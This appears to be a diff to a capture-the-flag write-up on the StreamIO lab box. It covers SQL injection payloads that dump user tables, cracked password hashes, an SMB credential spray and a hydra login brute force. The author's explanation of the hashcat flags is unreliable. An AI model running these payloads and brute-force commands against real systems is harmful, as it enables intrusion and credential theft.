@@ -204,3 +204,121 @@ The purpose of this query is to extract the names of all databases on the server
 {% embed url="https://learn.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver16" %}
 
 we can see in this doc that all the DB's are system DB's, our DB is `STREAMIO`
+
+so to continue our sqli i look at the syntax on the website:
+
+{% embed url="https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-objects-transact-sql?view=sql-server-ver16" %}
+
+<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+```
+abcd'union select 1,name,id,4,5,6 from streamio..sysobjects where xtype='U';-- -
+```
+
+<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+we continue our way in:&#x20;
+
+```
+abcd' union select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,901578250);-- -
+```
+
+<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+we got the interesting tables, so now we'll try getting both at once:
+
+```
+abcd'union select 1,username,3,4,5,6 from users;-- -
+```
+
+<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+We could try to do the same for the password and go from there but let's directly concat the 2 in one query:
+
+```
+abcd'union select 1,concat(username,':',password),3,4,5,6 from users;-- -
+```
+
+<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+So you put the passwords in a txt file and start cracking them with haschat&#x20;
+
+```
+hashcat hashesStreamio.txt /usr/share/wordlists/rockyou.txt --user -m 0 --show
+```
+
+<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+* `--user` is an option that specifies that the attack mode is set to "user-mode", which is used for cracking hashes of user passwords.
+* `-m 0` is an option that specifies the hash type to be cracked. In this case, the hash type is set to 0, which is the default hash type for hashcat.
+* `--show` is an option that specifies that the cracked passwords should be displayed.
+
+you can do it with all of them at one:
+
+```
+admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
+Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
+Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
+Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
+dfdfdf:ae27a4b4821b13cad2a17a75d219853e:dfdfdf
+Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
+[...]
+```
+
+Now if you want to do a high scale separation:
+
+```
+cat hashesStreamio | cut -d: -f1 > user
+cat hashesStreamio | cut -d: -f3 > pass
+```
+
+<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+then to test out all the hashes:
+
+```
+crackmapexec smb 10.129.238.190 -u USER -p PASS --no-bruteforce --continue-on-success
+```
+
+Unfortunately Everything fails
+
+<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+But we still got valid creds so it's not too hard to guess where we need to go after that:
+
+<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+We could try all manual, but let's automatize:
+
+Let's format it for a bruteforce:
+
+```
+cat HASHESV2 | cut -d: -f1,3 > userpass
+```
+
+<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+
+```
+hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
+```
+
+Which will output:
+
+```
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-12 21:54:58
+[DATA] max 13 tasks per 1 server, overall 13 tasks, 13 login tries, ~1 try per task
+[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=failed
+[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-12 21:55:00
+```
+
+We are able to connect and after further enumeration, access the admin page:
+
+<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+
+I am able to delete some stuff from the database:
+
+<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
